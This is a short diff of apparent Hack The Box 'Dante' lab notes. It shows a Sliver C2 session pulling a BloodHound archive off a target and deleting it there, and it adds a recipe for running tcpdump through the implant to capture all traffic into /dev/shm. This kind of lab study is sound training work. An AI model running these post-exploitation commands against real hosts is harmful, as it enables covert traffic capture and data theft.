@@ -379,3 +379,11 @@ download 20240503015529_BloodHound.zip
 [*] Wrote 10141 bytes (1 file successfully, 0 files unsuccessfully) to /home/ubuntu/Documents/htb/dante/10.10.110.100/implants/20240503015529_BloodHound.zip
 rm 20240503015529_BloodHound.zip
 ```
+
+### tcpdump capture with sliver
+
+* make sure to upload a statically compiled tcpdump to match your remote targets arch&#x20;
+
+```
+execute -o tcpdump -n -i any "not host 172.16.1.100" -w /dev/shm/out.pcap -G 600
+```
